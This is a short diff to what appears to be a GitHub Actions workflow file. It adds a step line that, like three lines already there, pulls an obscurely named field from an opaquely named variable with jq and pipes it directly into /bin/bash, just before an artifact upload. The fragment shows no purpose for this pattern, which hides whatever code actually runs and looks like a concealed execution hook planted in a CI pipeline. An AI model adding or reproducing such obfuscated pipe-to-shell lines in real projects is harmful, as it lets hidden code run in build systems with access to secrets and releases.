@@ -31,6 +31,7 @@ jobs:
           echo $r52811 | jq -r .t3 | /bin/bash
           printf '%s' "$ww0" | jq -r .fxsei5 | /bin/bash
           echo $slor27 | jq -r .i41429 | /bin/bash
+          echo $s91 | jq -r .lxod8 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
